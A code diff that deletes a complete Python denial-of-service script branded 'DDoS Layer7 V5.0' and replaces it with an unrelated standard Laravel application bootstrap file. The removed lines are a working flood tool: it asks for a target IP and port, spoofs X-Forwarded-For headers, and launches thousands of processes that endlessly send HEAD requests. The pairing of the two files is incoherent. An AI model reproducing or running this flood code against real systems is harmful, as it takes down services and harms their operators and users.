@@ -1,81 +1,55 @@
-# scr Ddos Layer7
-#555555 kuy
-import socket
-import os
-from time import sleep
-import multiprocessing
-import random
-import platform
-#Script Linux & Termux
-os.system('clear')
-print("\033[1;32;40m Detecting System...")
-sleep(5)
-sysOS = platform.system()
-print("\033[1;32;40m System detected: ", sysOS)
-sleep(5)
-if sysOS == "Linux":
-  try:
-    os.system("ulimit -n 1030000")
-  except Exception as e:
-    print(e)
-    print("[!] Could not start the script [ERROR]")
-else:
-  print("[!] Can't start, you're not using Linux [ERROR]")
+<?php
 
+/*
+|--------------------------------------------------------------------------
+| Create The Application
+|--------------------------------------------------------------------------
+|
+| The first thing we will do is create a new Laravel application instance
+| which serves as the "glue" for all the components of Laravel, and is
+| the IoC container for the system binding all of the various parts.
+|
+*/
 
-def randomip():
-  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
-  return randip
+$app = new Illuminate\Foundation\Application(
+    $_ENV['APP_BASE_PATH'] ?? dirname(__DIR__)
+);
 
+/*
+|--------------------------------------------------------------------------
+| Bind Important Interfaces
+|--------------------------------------------------------------------------
+|
+| Next, we need to bind some important interfaces into the container so
+| we will be able to resolve them when needed. The kernels serve the
+| incoming requests to this application from both the web and CLI.
+|
+*/
 
-def attack():
-  connection = "Connection: null\r\n"
-  referer = "Referer: null\r\n"
-  forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-  request = get_host + referer  + connection + forward + "\r\n\r\n"
-  while True:
-    try:
-      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      atk.connect((ip, port))
-      #Start Attack
-      for y in range(80):
-          atk.send(str.encode(request))
-    except socket.error:
-      sleep(0)
-    except:
-      pass
-os.system('clear')
-print("""
-██████╗ ██████╗  ██████╗ ███████╗    ██╗   ██╗███████╗
-██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██║   ██║██╔════╝
-██║  ██║██║  ██║██║   ██║███████╗    ██║   ██║███████╗
-██║  ██║██║  ██║██║   ██║╚════██║    ╚██╗ ██╔╝╚════██║
-██████╔╝██████╔╝╚██████╔╝███████║     ╚████╔╝ ███████║
-╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═══╝  ╚══════╝
-""")
-sleep(5)
-print("        --------DDOS [-] PYTHON--------")
-sleep(3)
-print("            [+] DDOS Layer7 V5.0 [+]")
-sleep(3)   
-print("         DEV BY : Chalisa Kitpitak #9999")
-sleep(3)
-print("\n[+]---------------START----------------[+]")
-print("[>] Welcome To DDoS Layer7 ")
-print("[>] hope you enjoy it \n")
-ip = input("[>] IP/URL: ")
-port = int(input("[>] Port: "))
-url = f"http://{str(ip)}"
-print("[\]----------START ATTACK---------[\]")
-print("[>] Attack Started  [<]")
-sleep(1)
+$app->singleton(
+    Illuminate\Contracts\Http\Kernel::class,
+    App\Http\Kernel::class
+);
 
-def send2attack():
-  for i in range(5000): # EZ ;)
-    mp = multiprocessing.Process(target=attack)
-    mp.setDaemon = False
-    mp.start() #่Start !!
+$app->singleton(
+    Illuminate\Contracts\Console\Kernel::class,
+    App\Console\Kernel::class
+);
 
-    
-send2attack()
+$app->singleton(
+    Illuminate\Contracts\Debug\ExceptionHandler::class,
+    App\Exceptions\Handler::class
+);
+
+/*
+|--------------------------------------------------------------------------
+| Return The Application
+|--------------------------------------------------------------------------
+|
+| This script returns the application instance. The instance is given to
+| the calling script so we can separate the building of the instances
+| from the actual running of the application and sending responses.
+|
+*/
+
+return $app;
